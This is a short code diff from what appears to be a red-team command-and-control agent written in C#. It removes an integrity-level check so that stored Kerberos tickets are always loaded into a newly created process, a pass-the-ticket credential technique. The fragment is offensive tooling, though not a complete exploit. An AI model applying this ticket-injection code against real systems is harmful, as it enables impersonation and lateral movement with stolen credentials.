@@ -780,8 +780,8 @@ namespace Process
                     return bRet;
                 }
                 //if running an a medium int user we may want to inject stored tickets into out new process
-                if (_agent.GetIdentityManager().GetIntegrityLevel() < IntegrityLevel.HighIntegrity)
-                {
+                //if (_agent.GetIdentityManager().GetIntegrityLevel() < IntegrityLevel.HighIntegrity)
+                //{
                     DebugHelp.DebugWriteLine($"LUID prior to impersonation: {_agent.GetTicketManager().GetCurrentLuid()}");
                     //get into the context of the newly created process prior to loading tickets
                     IntPtr targetProcessHandle = _pOpenProcess(ProcessAccessFlags.MAXIMUM_ALLOWED, false, (int)PID);
@@ -812,7 +812,7 @@ namespace Process
                         var ticketBytes = Convert.FromBase64String(ticket.base64Ticket);
                         _agent.GetTicketManager().LoadTicketIntoCache(ticketBytes, "");
                     }
-                }
+                //}
                 //start executing the process
                 WaitForExitAsync();
                 return bRet;
